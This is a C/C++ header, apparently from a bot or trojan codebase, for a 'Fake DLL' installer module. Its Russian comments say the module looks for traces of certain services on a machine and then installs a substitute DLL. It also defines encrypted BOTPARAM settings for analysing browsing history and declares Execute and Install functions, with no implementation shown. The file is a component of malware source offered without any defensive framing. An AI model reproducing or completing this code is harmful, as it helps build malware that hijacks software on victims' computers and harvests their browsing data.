//---------------------------------------------------------------------------
//
//  Модуль инсталяции подставной DLL (Fake DLL)
//
//  Модуль ищет на компьютере следы необходимых
//  сервисов и, в случае нахождения, выполняет
//  команду установки подставной длл
//
//
//---------------------------------------------------------------------------

#ifndef FakeDllInstallerH
#define FakeDllInstallerH

//---------------------------------------------------------------------------
#include <windows.h>
#include "Strings.h"


#define BOTPARAM_HISANALIZERLINKS "_HIS_ANALIZER_LINKS_\0"

#define BOTPARAM_SIZE_HISANALIZERLINKS 10000

#define BOTPARAM_HASH_HISANALIZERLINKS 0x8CBDB122 /* _HIS_ANALIZER_LINKS_ */


#ifdef DEBUGCONFIG
#	define BOTPARAM_ENCRYPTED_HISANALIZERLINKS false
#else
#	define BOTPARAM_ENCRYPTED_HISANALIZERLINKS true
#endif




namespace FDI
{
	//------------------------------------------------------
	// Execute - Фуекция запускает анализ истории навигации
	//------------------------------------------------------
	void Execute();

	//------------------------------------------------------
	//  Функция запускает установку Fake DLL
	//------------------------------------------------------
	void Install();
}


//---------------------------------------------------------------------------
#endif
